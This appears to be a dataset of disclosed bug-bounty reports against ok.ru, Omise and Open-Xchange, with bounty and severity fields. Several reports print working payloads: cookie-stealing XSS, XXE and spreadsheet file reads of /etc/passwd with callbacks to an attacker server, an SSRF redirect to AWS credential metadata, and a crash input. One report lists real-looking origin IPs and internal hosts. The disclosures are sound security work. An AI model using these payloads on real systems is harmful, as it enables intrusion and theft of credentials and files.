ok.ru,501-1000,0.0,100m-200m,$500.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Xss in m.ok.ru,hamooda_anonphantom  submitted a report to ok.ru.May 8th (7 years ago),https://hackerone.com/reports/137126,Moscow,Russia,Moscow,2016,5,8,15,27
ok.ru,501-1000,0.0,100m-200m,$500.00,High,7.95,Privacy Violation,Privacy violation для аттачей в сообщениях.,"iframe  submitted a report to ok.ru.Jul 4th (4 years ago)Summary by iframeVulnerability allowed downloading other people's files from private messages.
Уязвимость позволяла скачивать чужие файлы из личных сообщений без возможности определить отправителя и получателя.",https://hackerone.com/reports/377115,Moscow,Russia,Moscow,2018,7,4,14,27
Omise,251-500,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Broken Authentication and Session Management Flaw After Change Password and Logout,"root_geek  submitted a report to Omise.Jul 3rd (3 years ago)Summary
Usually it's happened that when you change password or sign out from one place (or one browser), automatically someone who is open same account will sign out too from another browser. Basically your session destroyed at server side...
But in your site, it still alive..
PoC
Detail About Vulnerability and PoC on Attachment File
Noted: You can try these vulnerability in another site. (e.g cryptfolio.com, facebook.com, etc). It's not alive when another has changed password and sign out
For More Information about This Vulnerability You can check OWASP Guide
https://www.owasp.org/index.php?title=Broken_Authentication_and_Session_Management&setlang=en
Attachment Video
https://gofile.io/?c=Vt4m42
Impact
Account profile still can be edited even in another browser the account has signedout and changed password",https://hackerone.com/reports/634488,Bangkok,Thailand,Bangkok,2019,7,3,15,24
Omise,251-500,0.0,10m-50m,$200.00,Medium,5.45,Improper Access Control - Generic,"Found Origin IP's Lead To Access To [ Grafana Instance , PgHero Instance [ Can SQL Injection ]  ","elmahdi  submitted a report to Omise.Sep 4th (3 years ago)Hello through RECON for on go.exchange i found origin ip's on https://censys.io/ipv4?q=go.exchange That's allow to the attacker to access to Many Instances Like ( Grafana [ But Need Crediantles ]  And Access To PgHero and TokenModel · GO.Exchange  where the attacker can use pghero to Execute postgresql Queries ]
Origin Ip's :
####1.  35.244.190.123
####2.  35.227.254.117
####3.  35.240.155.199
####4.  35.201.99.84
####5.  35.244.200.254 - pghero.dev-go.exchange [ PgHero Instance ]
####6.  34.96.94.220 - token-model.dev-go.exchange [ TokenModel · GO.Exchange ]
####7.  35.244.144.67  - yourtrack.dev-go.exchange [ Your Track Instance ]
####8.  35.241.6.32 - grafana.dev-go.exchange [ Grafana Instance ]
####9.  35.190.7.180
####10. 35.241.27.91
####11.  35.187.241.152
PgHero Instance :
curl -i -s -k  -X $'GET' \     -H $'Host: pghero.dev-go.exchange' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H $'Sec-Fetch-Site: same-origin' -H $'Referer: https://35.244.200.254/explain' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.' \     $'https://35.244.200.254/'
###Or Go To Burp suite > Options > Replace&Match
####1. Set Header request And
Host: 35.244.200.254 Host: pghero.dev-go.exchange
####And do the action with other Instances
Impact
Access To Instances for origin server's",https://hackerone.com/reports/687908,Bangkok,Thailand,Bangkok,2019,9,4,16,34
Omise,251-500,0.0,10m-50m,$700.00,High,7.1,Server-Side Request Forgery (SSRF),SSRF in webhooks leads to AWS private keys disclosure,"honoki  submitted a report to Omise.Mar 12th (4 years ago)Vulnerability Summary
Omise makes use of Amazon AWS as their application environment. Due to a vulnerability in the way webhooks are implemented, an attacker can make arbitrary HTTP/HTTPS requests from the application server and read their responses. This is known as a server-side request forgery (SSRF) vulnerability.
This vulnerability leads to access to Omise's Amazon EC2 instance with the user role aws-opsworks-ec2-role, including AWS private keys.
Description
The vulnerability exists in the way webhooks follow redirects. In general, it appears that redirects are not followed, but a HTTP 303 See Other status code allows an attacker to bypass this restriction.
By pointing my webhook URL to a server that issues a 303 redirect, I am able to redirect and read the responses of arbitrary HTTP/HTTPS requests from the application server. E.g. the following PHP script results in a successful request that is followed by the server:
<?php header('Location: http://<arbitrary-location>', TRUE, 303); ?>
As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role
Steps to reproduce

Host the following payload on https://<your-attacker-server>/redir.php:

Code 127 BytesWrap lines Copy Download1<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>

Point your webhook endpoint on https://dashboard.omise.co/test/webhooks/edit to https://<your-attacker-server>/redir.php
Make a random call to the API, e.g. adding a user;
View the ""Recent Deliveries"" of the webhook calls on https://dashboard.omise.co/test/webhooks
Note the 200 OK status code indicating a successful redirect
Click the event to view the response body of the AWS metadata

Recommendation
I recommend to ensure all input provided to the endpoint is validated. In this case, ensure that 303 redirects are not followed either.
I also recommend resetting all AWS access tokens. In addition, I recommend reviewing the Amazon access logs to investigate if this vulnerbility has been exploited in the past.
Attachments

20190312_AWS-SSRF-303-redirect-2.png - Screenshot showing the output of the AWS credentials obtained through the SSRF vulnerability.
20190312_AWS-SSRF-303-redirect.png - Screenshot showing the output of the AWS index of metadata.

Impact
By exploiting this vulnerability, an unauthorized attacker could gain access to the AWS environment of Omise. Note that the SSRF vulnerability could be abused in a variety of ways, not just limited to obtaining AWS credentials. For example, to enumerate and access services and web applications running on the internal network.2 attachments:F440082: 20190312_AWS-SSRF-303-redirect-2.pngF440083: 20190312_AWS-SSRF-303-redirect.png",https://hackerone.com/reports/508459,Bangkok,Thailand,Bangkok,2019,3,12,14,32
Open-Xchange,251-500,0.0,10m-50m,"$2,000.00",Critical,9.5,XML External Entities (XXE),Blind XXE via Powerpoint files,"mishre  submitted a report to Open-Xchange.Apr 7th (5 years ago)Summary
During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server. I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here:
http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.
 I'll try to follow up with a full poc for reading files later today/tomorrow.
Steps to Reproduce

Create a powerpoint slide.
Open the created file using winrar (a pptx file is actually an archive).
Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:

Code 181 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<a:tblStyleLst xmlns:a=""http://schemas.openxmlformats.org/drawingml/2006/main"" def=""{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}""/>
Now, setup a server where you can view incoming connections and save the file to look like this:
Code 270 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM ""https://{your-address}/"">]><r>&sp;</r>
3<a:tblStyleLst xmlns:a=""http://schemas.openxmlformats.org/drawingml/2006/main"" def=""{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}""/>

Put the updated file back into the pptx by dragging it to the ppt folder.
Upload the file to Open-XChange and open it up. 
Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.

Payload to view if a file exists on the server
Code 315 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd""><!ENTITY sp SYSTEM ""https://{your-server}/"">]><r>&xxe;&sp;</r>
3<a:tblStyleLst xmlns:a=""http://schemas.openxmlformats.org/drawingml/2006/main"" def=""{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}""/>
If you receive a request to the server this means the file exists. For example this payload:
Code 350 BytesWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
2<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwdafasdfqwe""><!ENTITY sp SYSTEM ""https://recorder.run.aws-usw02-pr.ice.predix.io/"">]><r>&xxe;&sp;</r>
3<a:tblStyleLst xmlns:a=""http://schemas.openxmlformats.org/drawingml/2006/main"" def=""{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}""/>
will not generate an http request to your server.
Impact
An attacker can extract different data from the server (possibly read local files), and make arbitrary request to any server.",https://hackerone.com/reports/334488,Bavaria,Germany,Nuremberg,2018,4,7,16,44
Open-Xchange,251-500,0.0,10m-50m,$50.00,No value,0.0,Buffer Over-read,Buffer over-reads in i_stream_zlib_read,"catenacyber  submitted a report to Open-Xchange.Mar 26th (3 years ago)This can be reproduced by a sample program using libcompression
Code 631 BytesWrap lines Copy Download1int main(int argc, char *argv[]) {
2    const unsigned char *datadec;
3    size_t sizedec;
4    const uint8_t *data = argv[1];
5    size_t size = strlen(data);
6    struct istream *test_input = test_istream_create_data(data, size);
7    const struct compression_handler *handler = compression_detect_handler(test_input);
8    i_stream_seek(test_input, 0);
9    if (handler != NULL && handler->create_istream != NULL) {
10        struct istream *input = handler->create_istream(test_input, TRUE);
11        i_stream_unref(&test_input);
12        i_stream_read_more(input, &datadec, &sizedec);
13        i_stream_unref(&input);
14    }
15    return 0;
16}
with input being \x1f\x8b\x01Dovec/\x01\xbf
Stack trace is 
Code 712 BytesWrap lines Copy Download1==40290==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000001de at pc 0x00010a2dce25 bp 0x7ffee5964f70 sp 0x7ffee5964f68
2READ of size 1 at 0x6020000001de thread T0
3    #0 0x10a2dce24 in be16_to_cpu_unaligned byteorder.h:179
4    #1 0x10a2dcdae in le16_to_cpu_unaligned byteorder.h:232
5    #2 0x10a2dc80a in i_stream_zlib_read_header istream-zlib.c:107
6    #3 0x10a2dac41 in i_stream_zlib_read istream-zlib.c:221
7    #4 0x10a3061d3 in i_stream_read_memarea istream.c:313
8    #5 0x10a305f1a in i_stream_read istream.c:271
9    #6 0x10a309023 in i_stream_read_data istream.c:745
10    #7 0x10a29bad0 in i_stream_read_more istream.h:224
11    #8 0x10a29b9e9 in LLVMFuzzerTestOneInput fuzz-compression.c:29
Patch is fixing the comparaison direction :
Code 1.06 KiBWrap lines Copy Download1diff --git a/src/lib-compression/istream-zlib.c b/src/lib-compression/istream-zlib.c
2index 3e514cab84..c04df039d8 100644
3--- a/src/lib-compression/istream-zlib.c
4+++ b/src/lib-compression/istream-zlib.c
5@@ -100,12 +100,12 @@ static int i_stream_zlib_read_header(struct istream_private *stream)
6                return -1;
7        }
8        if ((data[3] & GZ_FLAG_FEXTRA) != 0) {
9-               if (pos + 2 < size)
10+               if (pos + 2 > size)
11                        return 0;
12 
13                fextra_size = le16_to_cpu_unaligned(&data[pos]);
14                pos += 2;
15-               if (pos + fextra_size < size)
16+               if (pos + fextra_size > size)
17                        return 0;
18                pos += fextra_size;
19        }
20@@ -122,7 +122,7 @@ static int i_stream_zlib_read_header(struct istream_private *stream)
21                } while (data[pos++] != '\0');
22        }
23        if ((data[3] & GZ_FLAG_FHCRC) != 0) {
24-               if (pos + 2 < size)
25+               if (pos + 2 > size)
26                        return 0;
27                pos += 2;
28        }
Impact
An attacker could cause a crash if the buffer over reads crosses a memory page boundary, or achieve to extract sensitive information",https://hackerone.com/reports/832227,Bavaria,Germany,Nuremberg,2020,3,26,16,26
Open-Xchange,251-500,0.0,10m-50m,$350.00,Medium,4.2,Cryptographic Issues - Generic,Command Injection via STARTTLS in SMTP,"murgi  submitted a report to Open-Xchange.May 21st (about 1 year ago)During our research into the security of email servers at Münster
University of Applied Sciences, we found a command injection
vulnerability related to STARTTLS in Dovecot. See the attached
advisory for details.
The vulnerability allows a MITM attacker between a mail client and
Dovecot to inject unencrypted commands into the encrypted TLS
context, redirecting user credentials and mails to the attacker. An
attacker needs to have sending permissions on the Dovecot server.
We have also attached a test script (buftest.py) for you to reproduce this
vulnerability yourself. Usage is pretty simple, call:
python3 buftest.py <hostname> --smtp --smtp-port <port>
and watch the output, it should tell you if the server is still
vulnerable. Call the script without parameters for more usage information.
Impact
A MITM attacker can potentially steal SMTP user credentials and mails.2 attachments:F1309952: buftest.pyF1309953: Dovecot_Advisory.pdfSummary by murgiAn issue was found in the submission component of Dovecot. A MITM attacker could inject plaintext into STARTTLS encrypted sessions, potentially stealing credentials an emails. The issue was fixed by Open-Xchange in Dovecot v2.3.14.1 and v2.3.15 and was assigned CVE-2021-33515.
The full research results on issues with STARTTLS can be found on https://nostarttls.secvuln.info/.",https://hackerone.com/reports/1204962,Bavaria,Germany,Nuremberg,2021,5,21,11,46
Open-Xchange,251-500,0.0,10m-50m,$500.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF combined with IDOR within Document Converter exposes files,"logan5  submitted a report to Open-Xchange.Aug 22nd (4 years ago)Summary
There appears to be a vulnerability with the document converter service which allows an authenticated user or guest user with write permissions to export a victim’s files, regardless of permissions in place.  An example vulnerable endpoint is the following
https://sandbox.open-xchange.com/appsuite/api/oxodocumentconverter?action=getdocument&documentformat=pdf&priority=instant&filename=user1.txt&id=34%2F157&folder_id=34&mimetype=text%2Fplain&nocache=737&saveas_filename=user1.pdf&saveas_folder_id=34
The vulnerability consists of two steps, one requiring victim user interaction and the other action from the attacker. 
Step1:  CSRF vulnerability, victim user clicks on a link via a malicious email for example that will execute a URL similar to the above.   This will export a supported file into PDF format within their own home directory.
The above URL has been stripped of the following parameters which would usually be present:
UID: This is what enables the IDOR vulnerability.  Stripping the UID parameter will allow any authenticated user (and guest users that can write) to export the file to their own folders.  If the UID was in place then this is not possible.
Session:  The session token is unique and usually embedded within every HTTP request within the application.  Without it, the HTTP request usually fails.  In this case, dropping the session token does nothing. This allows the CSRF to be crafted as the parameters are now predictable.
Version: The version number has been removed
Step2:  The attacker needs to run an export PDF command of their own, this time changing the folder/file ID to being the victims file and also dropping the UID and Version parameter
Requirements for successful compromise:

The user must be logged in to App Suite with an active session or the CSRF will not execute.  
You will obviously need to know the correct target folder and file id to export.  This can be done through enumeration and trial/error
The target file has to be exportable as PDF

Note.  If the user deletes the created PDF file from their home directory after clicking the malicious link, it makes no difference in the outcome.
PoC Setup:
-Using the hosted environment at https://sandbox.open-xchange.com
Victim user: user.one@sandbox-5.open-xchange.com
Attacker user: user.two@sandbox-5.open-xchange.com
PoC
1)	Login as the victim user account (user.one@sandbox-5.open-xchange.com) and create a note file called ‘user1.txt’ with the contents “Hello, this is user1 of sandbox5”
Image F336690: user1_file.PNG 50.86 KiBZoom in Zoom out Copy Download
2)	Right-click on the file, select ‘save as pdf’.  Click on ‘Save’ and intercept the request within Burp Suite and send to the Repeater. Drop the original request and turn off the Intercept.
Note. Original request saved in 'user1_original.txt' for reference
Image F336693: user1_original.PNG 43.06 KiBZoom in Zoom out Copy Download
3)	Within the repeater, remove the following parameters:

UID
Session
Version

Note. You could remove other parameters as well such as ‘nocache’ and ‘filename’ as they are optional.  Modified request saved in 'user1_modified.txt'
Image F336692: user1_modified.PNG 42.59 KiBZoom in Zoom out Copy Download
4)	Right click on the edited request and click on ‘Copy URL’.  Paste the URL into the browser of the original victim user session that should still be running.  This is simulating the CSRF as if the link had come from a malicious email for example.  You will receive a response that the file has been created:
https://sandbox.open-xchange.com/appsuite/api/oxodocumentconverter?action=getdocument&documentformat=pdf&priority=instant&filename=user1.txt&id=34%2F157&folder_id=34&mimetype=text%2Fplain&nocache=737&saveas_filename=user1.pdf&saveas_folder_id=34
Image F336688: user1_csrf_1.PNG 47.83 KiBZoom in Zoom out Copy Download
Image F336689: user1_csrf_2.PNG 56.29 KiBZoom in Zoom out Copy Download
5)	In a separate browser session, I’ve used a Firefox private session.  Login as the attacker user (user.two@sandbox-5.open-xchange.com)
6)	In order to get the correct URL to modify, create your own text file (user2.txt) and save as PDF.  Send the request to the repeater. You can get rid of this file and drop the pdf creation request. 
Image F336687: user2_original.PNG 59.08 KiBZoom in Zoom out Copy Download
7)	In order to be brief, we will assume through trail and error that the attacker has enumerated the correct file/folder IDs for a file that can be converted to PDF and that the victim has clicked on the malicious link to expose the file via IDOR
8)	Modify the original attacker request and change the following fields to be the below:

Remove UID field
Remove filename=user2.txt  (Probably not required actually)
Change ID field to be 34%2F157   (This is 34/157 URL encoded, the victim file)
Change ‘folder_id’ field to be ‘34’

Click on ‘Go’ when ready
Image F336695: user2_export.PNG 89.66 KiBZoom in Zoom out Copy Download
Note. Modified request in 'user2_modifed.txt'
9)	View the file in the attacker browser, it is an exact copy of the victim file
Image F336696: user2_final.PNG 80.00 KiBZoom in Zoom out Copy Download
Further analysis
CSRF is not really my forte, but I believe it may be possible to embed multiple App suite links in a malicious website or malicious email that the user can access.   This would greatly increase the enumeration of target files.  If you would like me to look into this then let me know.
Impact
I’m divided on impact on this one.  Yes, it’s quite serious as you could potentially export any user’s confidential documents.  However, you are dependent on a target user initiating the attack and you also require an active authenticated session yourself.11 attachments:F336686: user2_modified.txtF336687: user2_original.PNGF336688: user1_csrf_1.PNGF336689: user1_csrf_2.PNGF336690: user1_file.PNGF336691: user1_modified.txtF336692: user1_modified.PNGF336693: user1_original.PNGF336694: user1_original.txtF336695: user2_export.PNGF336696: user2_final.PNGmheiland Open-Xchange staff  changed the status to Triaged. Aug 27th (4 years ago)Great find, nice documentation!logan5   posted a comment. Aug 28th (4 years ago)Thanks!  It was indeed a tricky one to find and put together.  Let me know if you have any questions.  All the best!mheiland Open-Xchange staff  closed the report and changed the status to Resolved. Aug 29th (4 years ago)We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.Open-Xchange  rewarded logan5 with a $500 bounty. Aug 29th (4 years ago)logan5   posted a comment. Aug 29th (4 years ago)Cheers for the quick resolve and bounty!mheiland Open-Xchange staff  updated the severity to medium. May 24th (3 years ago)logan5   requested to disclose this report. Jun 21st (3 years ago)logan5   posted a comment. Jul 5th (3 years ago)Any news on accepting this disclosure?
All the best.mheiland Open-Xchange staff  posted a comment. Jul 5th (3 years ago)Hi, it will auto-disclose in a couple of days. Cheers!logan5   posted a comment. Jul 5th (3 years ago)Sounds good!logan5   posted a comment. Jul 17th (3 years ago)Seems this did not auto-disclose, do you know what may be wrong?  Cheers.mheiland Open-Xchange staff  agreed to disclose this report. Jan 24th (3 years ago)  This report has been disclosed. Jan 24th (3 years ago)",https://hackerone.com/reports/398316,Bavaria,Germany,Nuremberg,2018,8,22,21,43
Open-Xchange,251-500,0.0,10m-50m,$300.00,Medium,5.45,Information Disclosure,IDOR - Deleting other user's signature via /appsuite/api/snippet?action=update (although an error is thrown),"inhibitor181  submitted a report to Open-Xchange.Jan 18th (6 years ago)Hello again, I have found that everybody can delete everybody's signature via a malformed PUT request in /appsuite/api/snippet?action=update. Although a processing error is thrown, the targeted signature is deleted.
POC
Code 257 BytesWrap lines Copy Download1PUT /appsuite/api/snippet?action=update&id=7&session=374be123c3f142ab8a63724bc62042e3 HTTP/1.1
2Host: sandbox.open-xchange.com
3/**/
4
5{""id"":""7"",""misc"":{""insertion"":""below"",""content-type"":""text/html""},""content"":""<p>&nbsp;test24<br></p>"",""displayname"":""test23""}
Response
Code 295 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Server: nginx
3/**.
4
5
6{""error"":""An error occurred inside the server which prevented it from fulfilling the request."",""error_params"":[""7""],""categories"":""ERROR"",""category"":8,""code"":""SNIPPET-0003"",""error_id"":""1561167371-118675"",""error_desc"":""No such snippet found for identifier: 7""}
Video POC attached.
PS : Out of trial reports for now until you resolve 1 or 2 of them, so you probably won't hear from me for some time :)",https://hackerone.com/reports/199321,Bavaria,Germany,Nuremberg,2017,1,18,11,2
Open-Xchange,251-500,0.0,10m-50m,$50.00,No value,0.0,NULL Pointer Dereference, Null pointer dereference in SMTP server function smtp_command_parse_data_with_size,"catenacyber  submitted a report to Open-Xchange.Mar 25th (3 years ago)Sending the following bytes to the SMTP server induces a NULL pointer dereference
Code 659 BytesWrap lines Copy Download10x20,0x0,0x0,0x1,0xa,0x20,0x0,0xa,0x20,0x39,0x20,0xa,0x8,0x3b,0xa,0x0,0x1,0xa,0x0,0x20,0xa,0x8,0x3b,0xa,0x42,0x46,0x41,0x54,0xa,0x44,0x41,0x54,0x20,0x51,0xa,0xa,0x42,0x44,0x41,0x54,0x20,0x35,0x20,0x42,0x44,0x41,0xa,0xff,0xa,0x20,0xfd,0xc1,0x42,0x20,0xfd,0x20,0xa,0xa,0x20,0x20,0xfd,0xa7,0x41,0x54,0x41,0x49,0x54,0x20,0x20,0xa,0x20,0xde,0x9e,0x9e,0x20,0x20,0xa,0xa,0x20,0xde,0xa,0xee,0xa,0x41,0x54,0x20,0x30,0x20,0xa,0x20,0x41,0x67,0xa,0x4d,0x41,0x49,0x4c,0x8a,0x20,0xa,0x42,0x44,0x41,0x54,0xa,0x42,0x44,0x41,0x54,0x20,0xa,0x52,0x53,0x45,0x54,0xa,0x20,0xbb,0x9c,0x2a,0x9,0x9,0x9,0x9,0x9,0x9,0x9,0x9,0xa,0x9,0x9,0x9,0x9,0x9,0x9,0x9,0xff,0x2d,0x54,0x54,0x2a,0xa,
Stack trace is
Code 756 BytesWrap lines Copy Download1    #0 0x10083ef30 in smtp_command_parse_data_with_size smtp-command-parser.c:498
2    #1 0x100849b2e in smtp_server_cmd_bdat smtp-server-cmd-data.c:660
3    #2 0x100854a46 in smtp_server_command_new smtp-server-command.c:248
4    #3 0x10086a139 in smtp_server_connection_handle_command smtp-server-connection.c:299
5    #4 0x1008693e3 in smtp_server_connection_handle_input smtp-server-connection.c:434
6    #5 0x100868d4a in smtp_server_connection_input smtp-server-connection.c:583
7    #6 0x1008f278b in io_loop_call_io ioloop.c:713
8    #7 0x1008f3970 in io_loop_call_pending ioloop.c:751
9    #8 0x1008f3449 in io_loop_handler_run ioloop.c:766
10    #9 0x1008f30cd in io_loop_run ioloop.c:738
11    #10 0x1007ebdc1 in LLVMFuzzerTestOneInput fuzz-smtp-server.c:86
Indeed smtp_server_cmd_bdat calls smtp_command_parse_data_with_size with first parameter being conn->smtp_parser which got assigned to NULL by the previous call to smtp_server_reply calling smtp_server_command_submit_reply, calling smtp_server_connection_terminate if conn->bad_counter > conn->set.max_bad_commands
One quick fix is 
Code 597 BytesWrap lines Copy Download1diff --git a/src/lib-smtp/smtp-server-cmd-data.c b/src/lib-smtp/smtp-server-cmd-data.c
2index 7d81d927f0..117a8b9b4e 100644
3--- a/src/lib-smtp/smtp-server-cmd-data.c
4+++ b/src/lib-smtp/smtp-server-cmd-data.c
5@@ -654,7 +654,7 @@ void smtp_server_cmd_bdat(struct smtp_server_cmd_ctx *cmd,
6                }
7        }
8 
9-       if (ret > 0 || size > 0) {
10+       if (ret > 0 || (size > 0 && conn->smtp_parser != NULL)) {
11                /* read/skip data even in case of error, as long as size is
12                   known */
13                input = smtp_command_parse_data_with_size(conn->smtp_parser,
Impact
A null pointer dereference induces a crash of the SMTP server",https://hackerone.com/reports/831290,Bavaria,Germany,Nuremberg,2020,3,25,14,40
Open-Xchange,251-500,0.0,10m-50m,$500.00,High,7.95,Cross-site Scripting (XSS) - Stored,[XSS] Style/Event Filter Bypass v3.0,"b42f97eb69dddcafe5cc278  submitted a report to Open-Xchange.Feb 9th (5 years ago)Hi.
New ways to bypass filter in the mail.
Previous reports #279073, #244821

onEvent filter bypass


If add { in style, then onEvents filter disabled.
Send e-mail:

Code 79 BytesWrap lines Copy Download1""content"": ""<img src=x style=font:\u0022'/{/onerror=alert(document.cookie)//>"",
Response:
Code 79 BytesWrap lines Copy Download1""content"":""<img src=\""x\"" style='font:\""'/{/onerror=alert(document.cookie)//'>""

Without onEvents


Without { you can using <a href='javascript:'>:

Code 83 BytesWrap lines Copy Download1""content"": ""<a style=font:\u0022'href=javascript:alert(document.cookie)//>aaa</a>"",
Response:
Code 81 BytesWrap lines Copy Download1""content"":""<a style='font: \""'href=javascript:alert(document.cookie)//;'>aaa</a>""
Impact
malicious code injection && execute unwanted actions on a web application in which they're currently authenticated
The hacker selected the Cross-site Scripting (XSS) - Stored weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
https://sandbox.open-xchange.com/
Verified
Yes",https://hackerone.com/reports/314204,Bavaria,Germany,Nuremberg,2018,2,9,11,49
Open-Xchange,251-500,0.0,10m-50m,$300.00,Medium,4.3,Denial of Service,A malicious user can upload a malicious script through managesieve  and trigger its execution in order to consume almost 100% of CPU (LMTP).,"rumata  submitted a report to Open-Xchange.Sep 23rd (2 years ago)Summary
A malicious user can create a  malicious sieve script (attached as ""test.sieve""), upload it to the server through managesieve and set as active. Then the user can send several specially crafted messages to himself to trigger long script execution. The attacker has to send one message per server core to get close to using 100% of CPU. The attacker can then disconnect from the server, but the high CPU usage will persist. It doesn't seem that the attack results in actual complete DoS, but it causes high resource consumption, which can result in financial loss or suspension of service from cloud provider (like in the case of Digital Ocean).
## The problem
(Please open the test.sieve file and look at the contents). Sieve execution isn't time-limited. Since the user can create a regex, even by using both a regex and a string less than 65536 symbols (limited by pigeonhole) the user comes close to macro time (around 200 ms of single-core execution on my laptop). It is then possible to simply repeat the match operation several times by duplicating the
Code 40 BytesWrap lines Copy Download1if string :regex  ""${final}"" ""${my_exp}""
If you repeat it 100 times, then one core will spend around 20 seconds on each letter to the malicious user.
When sieve was created, it was designed to be used without loops, because they could lead to a DoS from a malicious user. Then the MIME extension was introduced and it brought with itself a ""foreverypart"" loop. By using ""foreverypart"" and sending  a message like the following, we can multiply the time of the execution even further.
Code 77 BytesWrap lines Copy Download1MIME-Version: 1.0
2Content-Type: multipart/mixed; boundary=
3
4--
5--
6--
7--
8--
9--
With the MIME part limit being in the thousands, the attacker can send (number of cores on server) messages and throttle CPU for days.
## Solution
There needs to be a default limit for sieve execution or regexp execution. The former is probably better, since it can defend against problems with possible future sieve extensions. Sieve scripts that go over the limit should be flagged and deactivated.
Impact
High resource consumption / Server throttling / possible financial loss.2 attachments:F1000061: test.sieveF1000062: mail.mime",https://hackerone.com/reports/989668,Bavaria,Germany,Nuremberg,2020,9,23,18,55
Open-Xchange,251-500,0.0,10m-50m,$400.00,Medium,4.2,Memory Corruption - Generic,access to stack memory beyond array boundaries,"ihsinme  submitted a report to Open-Xchange.Feb 14th (3 years ago)in PowerDNS Recursive Server in the rec-carbon.cc file in the void doCarbonDump (void *) function, lines 36..43 contain vulnerable code:
…..
char tmp[80];
memset(tmp, 0, sizeof(tmp));
gethostname(tmp, sizeof(tmp));
char p = strchr(tmp, '.');
if(p) p=0;
    hostname=tmp;
boost::replaceall(hostname, ""."", """");
…….
the vulnerability of which is provided by the implementation of the gethostname function, which, with a long name, does not provide a terminating zero at the end of the line:
…..
if (uname (&buf))
return -1;
node_len = strlen (buf.nodename) + 1;
memcpy (name, buf.nodename, len < node_len ? len : node_len);
if (node_len > len)
{
set_errno (ENAMETOOLONG);
return -1;
}
return 0;
…….
The code section indicated above becomes active for execution under conditions if the carbon-server address is specified in the configuration file and carbon-ourname is not specified. At the same time, this code is vulnerable under conditions if the hostname is larger than 80 bytes and the stack on which the call is being made is dirty (not reset).
The first condition is provided by the SUS, POSIX and LSB standards which define a length of 255 bytes, but it is worth noting that Linux does not currently adhere to this and uses a length of 64 bytes.
But certified operating systems support this agreement. I was able to verify the operation of this error on FreeBSD 12.0, Solaris 11.4, MacOS 10.12 Sierra.
The second condition is provided by several calls to the specified function, after which the stack itself is filled with the data used. It is worth noting that to increase the string data in the stack, you must take into account the requirements of Small String Optimization on your architecture when creating the configuration file. It is also necessary to indicate that the section of code described above is present in the auth-carbon.cc, dnsdist-carbon.cc files, however, it is called there once and the stack is clean enough so that the vulnerability touches only the terminating zero from the byte following the buffer, which in my opinion is not is critical.
Impact
The essence of the impact consists in the possibility of including garbage data on the stack in the logs of the carbon server and, in certain circumstances, the possibility of overwriting data (byte '.' By 0x00), which in the worst case can affect the execution vector (when modifying the return address) and as a result of abnormal termination.
As part of my experiments, I was able to send data from the configuration file to the corbon server, including other server addresses, stack addressing, and even konarike and increase the line length from 0x50 to 0x111. Unfortunately, I realized quite late that x32 tests would be more effective, but if you are interested, I will gladly repeat them on x32 versions of operating systems.",https://hackerone.com/reports/796555,Bavaria,Germany,Nuremberg,2020,2,14,11,12
Open-Xchange,251-500,0.0,10m-50m,$900.00,Medium,6.5,Open Redirect,Another window.opener issue,zeeshank  submitted a report to Open-Xchange.Apr 14th (4 years ago),https://hackerone.com/reports/537840,Bavaria,Germany,Nuremberg,2019,4,14,10,17
Open-Xchange,251-500,0.0,10m-50m,"$2,000.00",Critical,10.0,Resource Injection,Arbitrary local system file read on open-xchange server ,"pnig0s  submitted a report to Open-Xchange.Jan 10th (5 years ago)Hi,
Summary:
I found a vulnerability that can read arbritary local file and also internal resource on Open-Xchange server.
Description:
I can create an crafted odt file and can successfully read any local files on Open-Xchange server when previewing this odt file.
Steps to Reproduce:
Here is the reproduction steps:
1.Create a openoffice calc file(ods);
2.Input =WEBSERVICE(""file:///etc/passwd"") in any cell and save the file;
3.Create a new openoffice document file(odt);
4.Click ""Insert""->""Object""->""OLE Object"" and import the ods file that just created;
5.Now we have a odt file embed with a ods file and can read any resource through WEBSERVICE function;
6.Just upload this odt file to the Open-Xchange through Drive feature and ""View"" it.The passwd content of Open-Xchange server will directly render on the page.
7.The original ods file also work too.
The passwd content:
Code 2.16 KiBWrap lines Copy Download1bin:x:2:2:bin:/bin:/usr/sbin/nologin
2sys:x:3:3:sys:/dev:/usr/sbin/nologin
3sync:x:4:65534:sync:/bin:/bin/sync
